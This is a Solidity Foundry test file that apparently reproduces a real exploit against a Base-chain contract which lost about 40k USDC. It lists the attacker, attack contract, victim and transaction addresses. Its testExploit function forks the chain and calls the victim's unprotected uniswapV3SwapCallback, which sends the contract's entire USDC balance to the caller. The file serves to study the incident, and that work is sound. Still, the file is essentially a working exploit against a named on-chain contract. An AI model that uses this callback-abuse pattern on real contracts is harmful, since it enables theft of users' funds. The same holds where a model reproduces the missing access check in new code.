// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 40k USDC
// Attacker : https://basescan.org/address/0x4efd5f0749b1b91afdcd2ecf464210db733150e0
// Attack Contract : https://basescan.org/address/0x2a59ac31c58327efcbf83cc5a52fae1b24a81440
// Vulnerable Contract : https://basescan.org/address/0x8d2Ef0d39A438C3601112AE21701819E13c41288
// Attack Tx : https://basescan.org/tx/0x6be0c4b5414883a933639c136971026977df4737b061f864a4a04e4bd7f07106

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x8d2Ef0d39A438C3601112AE21701819E13c41288#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1958354933247590450
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant USDC_ADDR = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant VICTIM = 0x8d2Ef0d39A438C3601112AE21701819E13c41288;

contract Contract0x8d2e is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 34459414 - 1;

    function setUp() public {
        vm.createSelectFork("base", blocknumToForkFrom);
        fundingToken = USDC_ADDR;
    }

    function testExploit() public balanceLog {
        uint256 balance = IERC20(USDC_ADDR).balanceOf(VICTIM);
        bytes memory data= abi.encode(USDC_ADDR, address(this));
        // The victim contract (0x8d2e) lacks access control in its uniswapV3SwapCallback function.
        // As a result, it transfers all USDC to the address specified in the parameters.
        IVictim(VICTIM).uniswapV3SwapCallback(int256(balance), 0, data);
    }
}

interface IVictim {
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}
